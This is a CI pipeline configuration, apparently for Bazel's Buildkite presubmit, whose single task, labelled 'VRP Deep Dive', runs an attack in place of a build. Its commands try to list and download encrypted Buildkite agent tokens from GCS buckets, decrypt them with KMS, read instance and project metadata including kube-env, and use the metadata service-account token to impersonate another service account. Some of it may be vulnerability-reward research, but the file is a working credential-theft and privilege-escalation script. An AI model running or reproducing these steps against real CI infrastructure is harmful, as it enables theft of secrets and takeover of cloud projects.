---
tasks:
  vrp_deep_dive:
    name: "VRP Deep Dive"
    platform: ubuntu2204
    shell_commands:
      - "set +e"
      - "echo === Round 10: Encrypted Secrets and BigQuery ==="
      - "echo"
      - "echo === 1. Try reading encrypted secrets buckets ==="
      - "gsutil ls gs://bazel-trusted-encrypted-secrets/ 2>&1 || true"
      - "echo"
      - "echo === 2. Try reading testing encrypted secrets ==="
      - "gsutil ls gs://bazel-testing-encrypted-secrets/ 2>&1 || true"
      - "echo"
      - "echo === 3. Try reading untrusted encrypted secrets ==="
      - "gsutil ls gs://bazel-untrusted-encrypted-secrets/ 2>&1 || true"
      - "echo"
      - "echo === 4. Try downloading trusted agent token enc ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/buildkite-trusted-agent-token.enc 2>&1 | xxd | head -5 || true"
      - "echo"
      - "echo === 5. Try downloading testing agent token enc ==="
      - "gsutil cat gs://bazel-testing-encrypted-secrets/buildkite-testing-agent-token.enc 2>&1 | xxd | head -5 || true"
      - "echo"
      - "echo === 6. Try downloading untrusted agent token enc ==="
      - "gsutil cat gs://bazel-untrusted-encrypted-secrets/buildkite-untrusted-agent-token.enc 2>&1 | xxd | head -5 || true"
      - "echo"
      - "echo === 7. Try KMS decrypt testing agent token ==="
      - "gsutil cat gs://bazel-testing-encrypted-secrets/buildkite-testing-agent-token.enc 2>&1 | gcloud kms decrypt --project bazel-untrusted --location global --keyring buildkite --key buildkite-testing-agent-token --ciphertext-file - --plaintext-file - --quiet 2>&1 || true"
      - "echo"
      - "echo === 8. Try KMS decrypt untrusted agent token ==="
      - "gsutil cat gs://bazel-untrusted-encrypted-secrets/buildkite-untrusted-agent-token.enc 2>&1 | gcloud kms decrypt --project bazel-untrusted --location global --keyring buildkite --key buildkite-untrusted-agent-token --ciphertext-file - --plaintext-file - --quiet 2>&1 || true"
      - "echo"
      - "echo === 9. BigQuery — list tables ==="
      - "bq ls bazel-untrusted:bazel_ci_metrics 2>&1 || true"
      - "echo"
      - "echo === 10. BigQuery — query recent data ==="
      - "bq query --nouse_legacy_sql --max_rows=5 'SELECT * FROM bazel_ci_metrics.INFORMATION_SCHEMA.TABLES' 2>&1 || true"
      - "echo"
      - "echo === 11. BigQuery — check bazel-public ==="
      - "bq ls --project_id bazel-public 2>&1 || true"
      - "echo"
      - "echo === 12. List all GCS buckets we can see ==="
      - "gsutil ls -p bazel-untrusted 2>&1 || true"
      - "echo"
      - "echo === 13. List GCS buckets in bazel-public ==="
      - "gsutil ls -p bazel-public 2>&1 || true"
      - "echo"
      - "echo === 14. Check instance template for more secrets ==="
      - "curl -s -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/attributes/?recursive=true' 2>&1 | python3 -m json.tool 2>&1 || true"
      - "echo"
      - "echo === 15. Check for custom metadata keys ==="
      - "curl -s -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/project/attributes/?recursive=true' 2>&1 | python3 -m json.tool 2>&1 || true"
      - "echo"
      - "echo === 16. Try impersonate testing SA ==="
      - "T=$(curl -s -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token | python3 -c 'import sys,json;print(json.load(sys.stdin)[\"access_token\"])')"
      - "curl -s -X POST -H \"Authorization: Bearer $T\" -H 'Content-Type: application/json' 'https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/buildkite@bazel-untrusted.iam.gserviceaccount.com:generateAccessToken' -d '{\"scope\":[\"https://www.googleapis.com/auth/cloud-platform\"],\"lifetime\":\"300s\"}' 2>&1 | python3 -m json.tool || true"
      - "echo"
      - "echo === 17. GCE metadata — kube-env ==="
      - "curl -s -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/attributes/kube-env' 2>&1 | head -20 || true"
      - "echo"
      - "echo === 18. List all KMS keys in buildkite keyring ==="
      - "gcloud kms keys list --project bazel-untrusted --location global --keyring buildkite --quiet 2>&1 || true"
      - "echo === DONE ==="
    build_targets:
      - "//..."
